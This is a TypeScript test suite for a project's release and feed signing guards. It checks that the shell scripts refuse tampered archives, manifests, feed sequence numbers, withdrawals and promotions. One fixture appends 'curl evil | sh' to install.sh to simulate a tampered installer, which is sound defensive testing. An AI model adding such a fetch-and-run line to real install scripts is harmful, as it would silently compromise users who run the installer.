// What the signing jobs check, in plain shell, before they sign (release.yml `sign`, `feed-sign`; feed.yml
// `resign-sign`). Each case runs the real script on a fixture tree and expects the refusal it should give.
import { spawnSync } from "node:child_process";
import { copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { parse } from "yaml";
import { sha256Sums } from "./checksums.ts";
import { emptyFeed, promoteRelease, publishRelease, resignFeed } from "./feed.ts";
import { artifactName, buildManifest, declaredSchemas, protocolRange } from "./manifest.ts";
import { BUNDLED_NODE } from "./node-pin.ts";
import { createHash } from "node:crypto";
import { stampVersion } from "./stamp.ts";

const repoRoot = join(import.meta.dirname, "../..");
const VERSION = "0.2.0";
const sha256 = (bytes: Uint8Array) => createHash("sha256").update(bytes).digest("hex");

const scratch: string[] = [];
afterEach(() => {
  for (const dir of scratch.splice(0)) rmSync(dir, { recursive: true, force: true });
});
const temp = (): string => {
  const dir = mkdtempSync(join(tmpdir(), "morndo-signing-"));
  scratch.push(dir);
  return dir;
};

const sh = (script: string, cwd: string, env: Record<string, string>) =>
  spawnSync("/bin/sh", [join(repoRoot, "scripts/release", script)], { cwd, encoding: "utf8", env: { PATH: process.env.PATH ?? "", ...env } });

describe("check-signing-release.sh", () => {
  const platforms = ["linux-x64", "linux-arm64", "darwin-arm64"] as const;

  function build() {
    const dir = temp();
    const dist = join(dir, "dist");
    mkdirSync(dist);
    copyFileSync(join(repoRoot, "install.sh"), join(dir, "install.sh"));
    const stamp = "2026-11-02T10:00:00Z";
    const git = (...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", ...args], {
      cwd: dir, encoding: "utf8", env: { PATH: process.env.PATH ?? "", GIT_AUTHOR_DATE: stamp, GIT_COMMITTER_DATE: stamp },
    });
    expect(git("init", "-q").status).toBe(0);
    expect(git("commit", "-q", "--allow-empty", "-m", "release").status).toBe(0);
    const sha = git("rev-parse", "HEAD").stdout.trim();
    const artifacts = platforms.map(platform => {
      const archive = Buffer.from(`archive for ${platform}\n`);
      const list = Buffer.from(`[]\n${platform}`);
      const name = artifactName(VERSION, platform);
      writeFileSync(join(dist, name), archive);
      writeFileSync(join(dist, `files-${platform}.json`), list);
      return { platform, name, size: archive.length, sha256: sha256(archive), filesSha256: sha256(list), node: BUNDLED_NODE };
    });
    const manifest = buildManifest({
      version: VERSION, commit: sha, publishedAt: Date.parse(stamp), repository: "o/r",
      protocol: protocolRange(), schemas: declaredSchemas(), artifacts,
    });
    writeFileSync(join(dist, "manifest.json"), manifest);
    writeFileSync(join(dist, "install.sh"), stampVersion(readFileSync(join(repoRoot, "install.sh"), "utf8"), VERSION));
    const names = [...artifacts.map(a => a.name), "manifest.json", "install.sh"];
    writeFileSync(join(dist, "SHA256SUMS"), sha256Sums(names.map(name => ({ name, bytes: readFileSync(join(dist, name)) }))));
    return { dir, dist, sha, archive: artifacts[0]!.name };
  }
  const run = (dir: string, sha: string, env: Record<string, string> = {}) =>
    sh("check-signing-release.sh", dir, { VERSION, RELEASE_SHA: sha, REPOSITORY: "o/r", BUNDLED_NODE, ...env });
  // Change the manifest, then make SHA256SUMS agree, so only the manifest check can object.
  const rewrite = (p: ReturnType<typeof build>, change: (text: string) => string) => {
    const manifest = join(p.dist, "manifest.json");
    const next = change(readFileSync(manifest, "utf8"));
    expect(next).not.toBe(readFileSync(manifest, "utf8"));
    writeFileSync(manifest, next);
    const names = readdirSync(p.dist).filter(name => name.endsWith(".tar.gz")).concat(["manifest.json", "install.sh"]);
    writeFileSync(join(p.dist, "SHA256SUMS"), sha256Sums(names.map(name => ({ name, bytes: readFileSync(join(p.dist, name)) }))));
  };

  it("passes on a consistent build", () => {
    const { dir, sha } = build();
    const done = run(dir, sha);
    expect(done.status, done.stderr).toBe(0);
  });

  it.each([
    ["an archive changed after the manifest was made", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, p.archive), "tampered\n"), /size|digest|SHA256SUMS/],
    ["an extra file in dist", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, "extra.txt"), "x"), /dist holds/],
    ["a missing archive", (p: ReturnType<typeof build>) => rmSync(join(p.dist, p.archive)), /dist holds/],
    ["an install.sh that differs from the committed script", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, "install.sh"), `${readFileSync(join(p.dist, "install.sh"), "utf8")}curl evil | sh\n`), /install\.sh|SHA256SUMS/],
    ["a signature that is already there", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, "manifest.json.sig"), "old"), /dist holds|already exists/],
    ["a files list changed after the manifest was made", (p: ReturnType<typeof build>) => writeFileSync(join(p.dist, "files-linux-x64.json"), "[]\n"), /files-linux-x64/],
  ])("refuses %s", (_name, change, message) => {
    const built = build();
    change(built);
    const done = run(built.dir, built.sha);
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/refusing to sign/);
    expect(done.stderr).toMatch(message);
  });

  it("refuses a manifest for another commit or version", () => {
    const { dir, sha } = build();
    expect(run(dir, sha, { RELEASE_SHA: "cd".repeat(20) }).status).toBe(1);
    expect(run(dir, sha, { VERSION: "0.2.1" }).status).toBe(1);
  });

  it.each([
    ["a Node version other than the pinned one", (text: string) => text.replaceAll(`"node": "${BUNDLED_NODE}"`, '"node": "24.0.0"'), /Node/],
    ["a publish date that is not the commit's", (text: string) => text.replace("2026-11-02T10:00:00Z", "2026-11-03T10:00:00Z"), /publish/],
    ["a notes link for another repository", (text: string) => text.replace("github.com/o/r/", "github.com/x/y/"), /notes/],
    ["an empty schemas object", (text: string) => text.replace(/"schemas": \{[\s\S]*?\n  \}/, '"schemas": {}'), /schema/],
    ["a schema version written as text", (text: string) => text.replace(/"version": (\d+),\n(\s+)"floor"/, '"version": "$1",\n$2"floor"'), /schema/],
    ['"schema": "1" as text', (text: string) => text.replace('"schema": 1', '"schema": "1"'), /schema 1/],
    ["a schema floor above its version", (text: string) => text.replace(/"floor": \d+/, '"floor": 999'), /schema/],
    ["a protocol range that runs backwards", (text: string) => text.replace(/"agent": \[\s*(\d+),\s*(\d+)\s*\]/, '"agent": [9, 2]'), /protocol/],
  ])("refuses a manifest with %s", (_name, change, message) => {
    const built = build();
    rewrite(built, change);
    const done = run(built.dir, built.sha);
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(message);
  });
});

describe("check-signing-feed.sh", () => {
  const NOW = Date.now();
  const manifestBytes = Buffer.from("{\"manifest\":true}\n");
  const entry = (version: string) => ({
    version, manifest: `https://github.com/o/r/releases/download/v${version}/manifest.json`,
    manifestSize: manifestBytes.length, manifestSha256: sha256(manifestBytes),
  });
  const keys = (version: number) => JSON.stringify({ schema: 1, version, expiresAt: "2027-11-02T10:00:00Z", root: ["a"], release: ["b"], feed: ["c"] });

  // A fake gh: the feed branch head is "h1" and its files are in prev/, the published manifest is manifest.json.
  function world(p: { branch: boolean; age?: number; headError?: boolean; pages?: "none" | "feed" | "empty" }) {
    const dir = temp();
    const prev = join(dir, "prev");
    mkdirSync(prev);
    mkdirSync(join(dir, "trust"));
    mkdirSync(join(dir, "site"));
    writeFileSync(join(dir, "trust/keys.json"), keys(1));
    writeFileSync(join(dir, "manifest.json"), manifestBytes);
    const then = NOW - (p.age ?? 5000);
    const latest = publishRelease(null, { channel: "latest", entry: entry("0.1.0"), now: then, keySetVersion: 1 });
    const stable = emptyFeed({ channel: "stable", now: then, keySetVersion: 1 });
    writeFileSync(join(prev, "latest.json"), latest);
    writeFileSync(join(prev, "stable.json"), stable);
    const gh = join(dir, "gh");
    writeFileSync(gh, [
      "#!/bin/sh",
      `D=${dir}`,
      'case "$*" in',
      `  *git/ref/heads/feed*) ${p.headError ? "echo 'gh: Server Error (HTTP 500)' >&2; exit 1" : p.branch ? 'echo h1' : "echo 'gh: Not Found (HTTP 404)' >&2; exit 1"} ;;`,
      `  *repos/o/r/pages*) ${p.pages === undefined || p.pages === "none" ? "echo 'gh: Not Found (HTTP 404)' >&2; exit 1" : "echo https://pages.example.invalid/site/"} ;;`,
      '  *per_page=100*) cat "$D/commits.txt" ;;',
      '  *contents/latest.json*)',
      '    ref=',
      '    for arg in "$@"; do',
      '      case $arg in *ref=*) ref=${arg#*ref=} ;; esac',
      '    done',
      '    if [ -n "$ref" ] && [ -f "$D/history/$ref.json" ]; then cat "$D/history/$ref.json"; else cat "$D/prev/latest.json"; fi ;;',
      '  *contents/stable.json*) cat "$D/prev/stable.json" ;;',
      '  *repos/o/r/releases*) cat "$D/release.json" ;;',
      '  "release download"*) while [ $# -gt 0 ]; do [ "$1" = --dir ] && out=$2; shift; done; cp "$D/manifest.json" "$out/manifest.json" ;;',
      "  *) exit 2 ;;",
      "esac",
      "",
    ].join("\n"), { mode: 0o755 });
    const curl = join(dir, "curl");
    writeFileSync(curl, [
      "#!/bin/sh",
      'while [ $# -gt 0 ]; do [ "$1" = -o ] && out=$2; shift; done',
      `echo '{}' > "$out"`,
      `printf ${p.pages === "feed" ? "200" : "404"}`,
      "",
    ].join("\n"), { mode: 0o755 });
    return { dir, gh, curl, latest, stable };
  }
  const check = (w: ReturnType<typeof world>, env: Record<string, string>) =>
    sh("check-signing-feed.sh", w.dir, { GH: w.gh, CURL: w.curl, REPOSITORY: "o/r", ...env });
  const put = (w: ReturnType<typeof world>, latest: string, stable: string) => {
    writeFileSync(join(w.dir, "site/latest.json"), latest);
    writeFileSync(join(w.dir, "site/stable.json"), stable);
  };

  it("passes a publish on the branch: latest +1 with the new entry, stable as it was", () => {
    const w = world({ branch: true });
    put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status, done.stderr).toBe(0);
  });

  it("passes a publish whose carried-over stable.json was issued hours ago: freshness is for the feed published now", () => {
    const w = world({ branch: true, age: 5 * 3_600_000 });
    put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status, done.stderr).toBe(0);
  });

  it("allows an approval wait: a feed prepared five hours ago is still fresh, one prepared two days ago is not", () => {
    const hours = 5 * 3_600_000;
    const w = world({ branch: true });
    put(w, resignFeed(w.latest, NOW - hours), resignFeed(w.stable, NOW - hours));
    const done = check(w, { MODE: "resign" });
    expect(done.status, done.stderr).toBe(0);
    const late = 2 * 86_400_000;
    put(w, resignFeed(w.latest, NOW - late), resignFeed(w.stable, NOW - late));
    const refused = check(w, { MODE: "resign" });
    expect(refused.status).toBe(1);
    expect(refused.stderr).toMatch(/issued/);
    put(w, resignFeed(w.latest, NOW + 2 * 3_600_000), resignFeed(w.stable, NOW + 2 * 3_600_000));
    expect(check(w, { MODE: "resign" }).stderr).toMatch(/issued/);
  });

  it("passes a first publish with no branch, and a re-sign", () => {
    const first = world({ branch: false });
    put(first, publishRelease(null, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), emptyFeed({ channel: "stable", now: NOW, keySetVersion: 1 }));
    const done = check(first, { MODE: "publish", VERSION });
    expect(done.status, done.stderr).toBe(0);
    const second = world({ branch: true });
    put(second, resignFeed(second.latest, NOW), resignFeed(second.stable, NOW));
    const again = check(second, { MODE: "resign" });
    expect(again.status, again.stderr).toBe(0);
  });

  it.each([
    ["a publish that changes stable.json", (w: ReturnType<typeof world>) => put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), resignFeed(w.stable, NOW)), /stable\.json/],
    ["a number that does not rise by one", (w: ReturnType<typeof world>) => put(w, resignFeed(resignFeed(publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), NOW), NOW), w.stable), /expected/],
    ["a release list that lost the old release", (w: ReturnType<typeof world>) => put(w, publishRelease(null, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }).replace('"seq": 1', '"seq": 2'), w.stable), /release list/],
    ["another key set than trust/keys.json", (w: ReturnType<typeof world>) => { put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable); writeFileSync(join(w.dir, "trust/keys.json"), keys(2)); }, /key set/],
    ["a manifest digest that is not the published one", (w: ReturnType<typeof world>) => put(w, publishRelease(w.latest, { channel: "latest", entry: { ...entry(VERSION), manifestSha256: "ef".repeat(32) }, now: NOW, keySetVersion: 1 }), w.stable), /digest/],
    ["a signature that is already there", (w: ReturnType<typeof world>) => { put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable); writeFileSync(join(w.dir, "site/latest.json.sig"), "old"); }, /already exists/],
    ["a feed issued two days ago", (w: ReturnType<typeof world>) => put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW - 2 * 86_400_000, keySetVersion: 1 }), w.stable), /issued/],
  ])("refuses %s", (_name, change, message) => {
    const w = world({ branch: true });
    change(w);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/refusing to sign/);
    expect(done.stderr).toMatch(message);
  });

  it.each([
    ["digest", (text: string) => text.replace(sha256(manifestBytes), "ef".repeat(32))],
    ["URL", (text: string) => text.replace("/v0.1.0/manifest.json", "/v0.1.0/other.json")],
    ["size", (text: string) => text.replace(`"manifestSize": ${manifestBytes.length}`, `"manifestSize": ${manifestBytes.length + 1}`)],
  ])("refuses a carried-over entry whose manifest %s was changed", (_what, tamper) => {
    const w = world({ branch: true });
    const changed = tamper(w.latest);
    expect(changed).not.toBe(w.latest);
    put(w, publishRelease(changed, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/release list/);
  });

  it("refuses a re-sign that changes an entry", () => {
    const w = world({ branch: true });
    put(w, resignFeed(w.latest.replace(sha256(manifestBytes), "ef".repeat(32)), NOW), resignFeed(w.stable, NOW));
    const done = check(w, { MODE: "resign" });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/release list/);
  });

  it("fails on a gh error that is not 'not found', instead of treating it as no branch", () => {
    const w = world({ branch: false, headError: true });
    put(w, publishRelease(null, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), emptyFeed({ channel: "stable", now: NOW, keySetVersion: 1 }));
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/cannot read the feed branch/);
  });

  it.each([
    ["a fractional seq", (text: string) => text.replace('"seq": 2', '"seq": 2.5')],
    ["a seq written as a string", (text: string) => text.replace('"seq": 2', '"seq": "2"')],
    ["a fractional key-set version", (text: string) => text.replace('"keySetVersion": 1', '"keySetVersion": 1.5')],
  ])("refuses %s", (_name, change) => {
    const w = world({ branch: true });
    const next = publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 });
    expect(change(next)).not.toBe(next);
    put(w, change(next), w.stable);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/whole number/);
  });

  it("refuses a missing feed branch when a feed is deployed: a deleted branch is not a first feed", () => {
    const w = world({ branch: false, pages: "feed" });
    put(w, publishRelease(null, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), emptyFeed({ channel: "stable", now: NOW, keySetVersion: 1 }));
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/feed is deployed but the feed branch is missing/);
  });

  it("allows a first feed when Pages has no site or no feed on it", () => {
    for (const pages of ["none", "empty"] as const) {
      const w = world({ branch: false, pages });
      put(w, publishRelease(null, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), emptyFeed({ channel: "stable", now: NOW, keySetVersion: 1 }));
      const done = check(w, { MODE: "publish", VERSION });
      expect(done.status, `${pages}: ${done.stderr}`).toBe(0);
    }
  });

  it("refuses a publish that carries over a stable.json that has already expired", () => {
    const w = world({ branch: true, age: 15 * 86_400_000 });
    put(w, publishRelease(w.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), w.stable);
    const done = check(w, { MODE: "publish", VERSION });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/stable\.json has expired/);
  });

  it("refuses a first feed that does not start at 1, and a re-sign with no branch", () => {
    const first = world({ branch: false });
    put(first, publishRelease(first.latest, { channel: "latest", entry: entry(VERSION), now: NOW, keySetVersion: 1 }), first.stable);
    expect(check(first, { MODE: "publish", VERSION }).status).toBe(1);
    expect(check(first, { MODE: "resign" }).stderr).toMatch(/needs a feed branch/);
  });

  const iso = (ms: number) => new Date(ms).toISOString().replace(/\.\d{3}Z$/, "Z");
  const bump = (text: string, now: number, withdrawn: string[], change?: (doc: { seq: number; keySetVersion: number; releases: { manifestSha256: string }[] }) => void) => {
    const doc = JSON.parse(text) as { seq: number; issuedAt: string; expiresAt: string; withdrawn: string[]; keySetVersion: number; releases: { manifestSha256: string }[] };
    doc.seq += 1;
    doc.issuedAt = iso(now);
    doc.expiresAt = iso(now + 14 * 86_400_000);
    doc.withdrawn = withdrawn;
    change?.(doc);
    return JSON.stringify(doc);
  };

  it("passes a withdrawal: both feeds +1, the lists as they were, the Version appended to withdrawn", () => {
    const w = world({ branch: true });
    put(w, bump(w.latest, NOW, ["0.1.0"]), bump(w.stable, NOW, ["0.1.0"]));
    const done = check(w, { MODE: "withdraw", VERSION: "0.1.0" });
    expect(done.status, done.stderr).toBe(0);
  });

  it("refuses a withdrawal that removes or edits a release", () => {
    const removed = world({ branch: true });
    put(removed, bump(removed.latest, NOW, ["0.1.0"], doc => { doc.releases = []; }), bump(removed.stable, NOW, ["0.1.0"]));
    const gone = check(removed, { MODE: "withdraw", VERSION: "0.1.0" });
    expect(gone.status).toBe(1);
    expect(gone.stderr).toMatch(/refusing to sign/);
    expect(gone.stderr).toMatch(/changed a release/);
    const edited = world({ branch: true });
    put(edited, bump(edited.latest, NOW, ["0.1.0"], doc => { doc.releases[0]!.manifestSha256 = "ef".repeat(32); }), bump(edited.stable, NOW, ["0.1.0"]));
    const changed = check(edited, { MODE: "withdraw", VERSION: "0.1.0" });
    expect(changed.status).toBe(1);
    expect(changed.stderr).toMatch(/changed a release/);
  });

  it("refuses a withdrawal that appends anything but the Version, or two entries, or a Version already withdrawn", () => {
    const other = world({ branch: true });
    put(other, bump(other.latest, NOW, ["0.9.9"]), bump(other.stable, NOW, ["0.1.0"]));
    const wrong = check(other, { MODE: "withdraw", VERSION: "0.1.0" });
    expect(wrong.status).toBe(1);
    expect(wrong.stderr).toMatch(/refusing to sign/);
    expect(wrong.stderr).toMatch(/withdrawn/);
    const two = world({ branch: true });
    put(two, bump(two.latest, NOW, ["0.1.0", "0.9.9"]), bump(two.stable, NOW, ["0.1.0"]));
    const extra = check(two, { MODE: "withdraw", VERSION: "0.1.0" });
    expect(extra.status).toBe(1);
    expect(extra.stderr).toMatch(/withdrawn/);
    const again = world({ branch: true });
    const prev = JSON.parse(readFileSync(join(again.dir, "prev/latest.json"), "utf8")) as { withdrawn: string[] };
    prev.withdrawn = ["0.1.0"];
    writeFileSync(join(again.dir, "prev/latest.json"), JSON.stringify(prev));
    put(again, bump(again.latest, NOW, ["0.1.0", "0.1.0"]), bump(again.stable, NOW, ["0.1.0"]));
    const held = check(again, { MODE: "withdraw", VERSION: "0.1.0" });
    expect(held.status).toBe(1);
    expect(held.stderr).toMatch(/already withdrawn/);
  });

  it("refuses a withdrawal of a Version the latest feed does not list", () => {
    const w = world({ branch: true });
    put(w, bump(w.latest, NOW, [VERSION]), bump(w.stable, NOW, [VERSION]));
    const done = check(w, { MODE: "withdraw", VERSION });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/refusing to sign/);
    expect(done.stderr).toMatch(/does not list/);
  });

  it("refuses a withdrawal with the wrong number, a changed key set, a stale issue time or an existing signature", () => {
    const number = world({ branch: true });
    put(number, bump(number.latest, NOW, ["0.1.0"], doc => { doc.seq = 9; }), bump(number.stable, NOW, ["0.1.0"]));
    expect(check(number, { MODE: "withdraw", VERSION: "0.1.0" }).stderr).toMatch(/expected/);
    const keysChanged = world({ branch: true });
    put(keysChanged, bump(keysChanged.latest, NOW, ["0.1.0"], doc => { doc.keySetVersion = 2; }), bump(keysChanged.stable, NOW, ["0.1.0"]));
    expect(check(keysChanged, { MODE: "withdraw", VERSION: "0.1.0" }).stderr).toMatch(/key set/);
    const stale = world({ branch: true });
    const old = NOW - 2 * 86_400_000;
    put(stale, bump(stale.latest, old, ["0.1.0"]), bump(stale.stable, old, ["0.1.0"]));
    expect(check(stale, { MODE: "withdraw", VERSION: "0.1.0" }).stderr).toMatch(/issued/);
    // stable is held to the same freshness as latest: a withdrawal writes both feeds now
    const staleStable = world({ branch: true });
    put(staleStable, bump(staleStable.latest, NOW, ["0.1.0"]), bump(staleStable.stable, old, ["0.1.0"]));
    const staleStableDone = check(staleStable, { MODE: "withdraw", VERSION: "0.1.0" });
    expect(staleStableDone.status).toBe(1);
    expect(staleStableDone.stderr).toMatch(/stable\.json was issued/);
    const signed = world({ branch: true });
    put(signed, bump(signed.latest, NOW, ["0.1.0"]), bump(signed.stable, NOW, ["0.1.0"]));
    writeFileSync(join(signed.dir, "site/latest.json.sig"), "old");
    expect(check(signed, { MODE: "withdraw", VERSION: "0.1.0" }).stderr).toMatch(/already exists/);
  });

  it("refuses a withdrawal without VERSION or with no feed branch", () => {
    const w = world({ branch: true });
    put(w, bump(w.latest, NOW, ["0.1.0"]), bump(w.stable, NOW, ["0.1.0"]));
    expect(check(w, { MODE: "withdraw" }).status).not.toBe(0);
    const missing = world({ branch: false });
    put(missing, bump(missing.latest, NOW, ["0.1.0"]), bump(missing.stable, NOW, ["0.1.0"]));
    const done = check(missing, { MODE: "withdraw", VERSION: "0.1.0" });
    expect(done.status).toBe(1);
    expect(done.stderr).toMatch(/a withdrawal needs a feed branch/);
  });

  const day = 86_400_000;
  const listing = (w: ReturnType<typeof world>, rows: { sha: string; ageDays: number; body: string }[]) => {
    mkdirSync(join(w.dir, "history"));
    const lines = rows.map(row => {
      writeFileSync(join(w.dir, "history", `${row.sha}.json`), row.body);
      return `${row.sha} ${iso(NOW - row.ageDays * day)}`;
    });
    writeFileSync(join(w.dir, "commits.txt"), `${lines.join("\n")}\n`);
  };
  const dates = (w: ReturnType<typeof world>, publishedAt: string) => {
    writeFileSync(join(w.dir, "manifest.json"), JSON.stringify({ manifest: true, publishedAt }));
    writeFileSync(join(w.dir, "release.json"), JSON.stringify({ published_at: publishedAt }));
  };

  it("passes a promotion: both feeds +1, stable gains the entry latest lists, latest's lists as they were, seven days on latest", () => {
    const w = world({ branch: true });
    listing(w, [
      { sha: "newer", ageDays: 2, body: w.latest },
      { sha: "first", ageDays: 8, body: w.latest },
      { sha: "older", ageDays: 30, body: emptyFeed({ channel: "latest", now: NOW - 30 * day, keySetVersion: 1 }) },
    ]);
    put(w, resignFeed(w.latest, NOW), promoteRelease(w.stable, w.latest, "0.1.0", NOW));
    const done = check(w, { MODE: "promote", VERSION: "0.1.0" });
    expect(done.status, done.stderr).toBe(0);
  });

  it("refuses a promotion before seven days on latest, counted from the first feed commit that lists the Version", () => {
    const young = world({ branch: true });
    listing(young, [
      { sha: "newer", ageDays: 1, body: emptyFeed({ channel: "latest", now: NOW - day, keySetVersion: 1 }) },
      { sha: "first", ageDays: 2, body: young.latest },
      { sha: "older", ageDays: 30, body: emptyFeed({ channel: "latest", now: NOW - 30 * day, keySetVersion: 1 }) },
    ]);
    dates(young, iso(NOW - 20 * day));
    put(young, resignFeed(young.latest, NOW), promoteRelease(young.stable, young.latest, "0.1.0", NOW));
    const refused = check(young, { MODE: "promote", VERSION: "0.1.0" });
    expect(refused.status).toBe(1);
    expect(refused.stderr).toMatch(/refusing to sign/);
    expect(refused.stderr).toMatch(/promotion needs 7/);
    const mature = world({ branch: true });
    listing(mature, [
      { sha: "newer", ageDays: 2, body: mature.latest },
      { sha: "first", ageDays: 8, body: mature.latest },
      { sha: "older", ageDays: 30, body: emptyFeed({ channel: "latest", now: NOW - 30 * day, keySetVersion: 1 }) },
    ]);
    dates(mature, iso(NOW - 20 * day));
    put(mature, resignFeed(mature.latest, NOW), promoteRelease(mature.stable, mature.latest, "0.1.0", NOW));
    const allowed = check(mature, { MODE: "promote", VERSION: "0.1.0" });
    expect(allowed.status, allowed.stderr).toBe(0);
  });

  it("refuses a promotion when no feed commit lists the Version, so its age cannot be told", () => {
    const w = world({ branch: true });
    listing(w, [
      { sha: "newer", ageDays: 1, body: emptyFeed({ channel: "latest", now: NOW - day, keySetVersion: 1 }) },
      { sha: "older", ageDays: 30, body: emptyFeed({ channel: "latest", now: NOW - 30 * day, keySetVersion: 1 }) },
    ]);
    dates(w, iso(NOW - 20 * day));
    put(w, resignFeed(w.latest, NOW), promoteRelease(w.stable, w.latest, "0.1.0", NOW));
    const refused = check(w, { MODE: "promote", VERSION: "0.1.0" });
    expect(refused.status).toBe(1);
    expect(refused.stderr).toMatch(/cannot tell when 0\.1\.0 was first listed on latest/);
  });

  it("refuses a promotion that adds an entry latest does not have, or changes the entry, or adds two", () => {
    const missing = world({ branch: true });
    const invented = JSON.parse(resignFeed(missing.stable, NOW)) as { releases: unknown[] };
    invented.releases = [entry("9.9.9")];
    put(missing, resignFeed(missing.latest, NOW), JSON.stringify(invented));
    const never = check(missing, { MODE: "promote", VERSION: "9.9.9" });
    expect(never.status).toBe(1);
    expect(never.stderr).toMatch(/refusing to sign/);
    expect(never.stderr).toMatch(/a Version latest never had/);
    const changed = world({ branch: true });
    const edited = JSON.parse(promoteRelease(changed.stable, changed.latest, "0.1.0", NOW)) as { releases: { manifestSha256: string }[] };
    edited.releases[0]!.manifestSha256 = "ef".repeat(32);
    put(changed, resignFeed(changed.latest, NOW), JSON.stringify(edited));
    const differ = check(changed, { MODE: "promote", VERSION: "0.1.0" });
    expect(differ.status).toBe(1);
    expect(differ.stderr).toMatch(/not the previous releases plus the one release/);
    const extra = world({ branch: true });
    const two = JSON.parse(promoteRelease(extra.stable, extra.latest, "0.1.0", NOW)) as { releases: unknown[] };
    two.releases.push(entry("0.3.0"));
    put(extra, resignFeed(extra.latest, NOW), JSON.stringify(two));
    const both = check(extra, { MODE: "promote", VERSION: "0.1.0" });
    expect(both.status).toBe(1);
    expect(both.stderr).toMatch(/not the previous releases plus the one release/);
  });

  it("refuses a promotion of a Version already in stable, or withdrawn in either feed", () => {
    const held = world({ branch: true });
    const stable = publishRelease(null, { channel: "stable", entry: entry("0.1.0"), now: NOW - 5000, keySetVersion: 1 });
    writeFileSync(join(held.dir, "prev/stable.json"), stable);
    put(held, resignFeed(held.latest, NOW), resignFeed(stable, NOW));
    const again = check(held, { MODE: "promote", VERSION: "0.1.0" });
    expect(again.status).toBe(1);
    expect(again.stderr).toMatch(/refusing to sign/);
    expect(again.stderr).toMatch(/already in the stable feed/);
    const fromLatest = world({ branch: true });
    const latest = fromLatest.latest.replace('"withdrawn": []', '"withdrawn": ["0.1.0"]');
    writeFileSync(join(fromLatest.dir, "prev/latest.json"), latest);
    put(fromLatest, resignFeed(latest, NOW), promoteRelease(fromLatest.stable, fromLatest.latest, "0.1.0", NOW));
    const latestHeld = check(fromLatest, { MODE: "promote", VERSION: "0.1.0" });
    expect(latestHeld.status).toBe(1);
    expect(latestHeld.stderr).toMatch(/is withdrawn/);
    const fromStable = world({ branch: true });
    const marked = fromStable.stable.replace('"withdrawn": []', '"withdrawn": ["0.1.0"]');
    writeFileSync(join(fromStable.dir, "prev/stable.json"), marked);
    const nextStable = JSON.parse(promoteRelease(fromStable.stable, fromStable.latest, "0.1.0", NOW)) as { withdrawn: string[] };
    nextStable.withdrawn = ["0.1.0"];
    put(fromStable, resignFeed(fromStable.latest, NOW), JSON.stringify(nextStable));
    const stableHeld = check(fromStable, { MODE: "promote", VERSION: "0.1.0" });
    expect(stableHeld.status).toBe(1);
    expect(stableHeld.stderr).toMatch(/is withdrawn/);
  });

  it("refuses a promotion that changes latest's lists or either withdrawn list", () => {
    const releases = world({ branch: true });
    const latest = JSON.parse(resignFeed(releases.latest, NOW)) as { releases: unknown[] };
    latest.releases = [];
    put(releases, JSON.stringify(latest), promoteRelease(releases.stable, releases.latest, "0.1.0", NOW));
    const dropped = check(releases, { MODE: "promote", VERSION: "0.1.0" });
    expect(dropped.status).toBe(1);
    expect(dropped.stderr).toMatch(/refusing to sign/);
    expect(dropped.stderr).toMatch(/changed a list a promotion keeps/);
    const withdrawn = world({ branch: true });
    const marked = JSON.parse(resignFeed(withdrawn.latest, NOW)) as { withdrawn: string[] };
    marked.withdrawn = ["0.0.9"];
    put(withdrawn, JSON.stringify(marked), promoteRelease(withdrawn.stable, withdrawn.latest, "0.1.0", NOW));
    const latestWithdrawn = check(withdrawn, { MODE: "promote", VERSION: "0.1.0" });
    expect(latestWithdrawn.status).toBe(1);
    expect(latestWithdrawn.stderr).toMatch(/changed a list a promotion keeps/);
    const stable = world({ branch: true });
    const next = JSON.parse(promoteRelease(stable.stable, stable.latest, "0.1.0", NOW)) as { withdrawn: string[] };
    next.withdrawn = ["0.0.9"];
    put(stable, resignFeed(stable.latest, NOW), JSON.stringify(next));
    const stableWithdrawn = check(stable, { MODE: "promote", VERSION: "0.1.0" });
    expect(stableWithdrawn.status).toBe(1);
    expect(stableWithdrawn.stderr).toMatch(/changed its withdrawn list/);
  });

